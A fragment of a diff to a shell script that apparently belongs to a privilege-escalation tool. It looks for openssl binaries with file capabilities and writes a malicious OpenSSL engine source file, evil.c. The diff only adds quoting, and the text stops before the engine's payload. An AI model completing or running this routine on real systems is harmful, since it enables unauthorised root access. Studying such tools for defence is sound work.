@@ -1,9 +1,9 @@
 #!/bin/sh
 
 if getcap -r / | grep "openssl"; then
-	cd $TMPDIR
-	touch $TMPDIR/evil.c
-	cat > $TMPDIR/evil.c << EOF
+	cd "${TMPDIR}"
+	touch "${TMPDIR}"/evil.c
+	cat > "${TMPDIR}"/evil.c << EOF
 #include <openssl/engine.h>
 #include <unistd.h>
 static int bind(ENGINE *e, const char *id) {
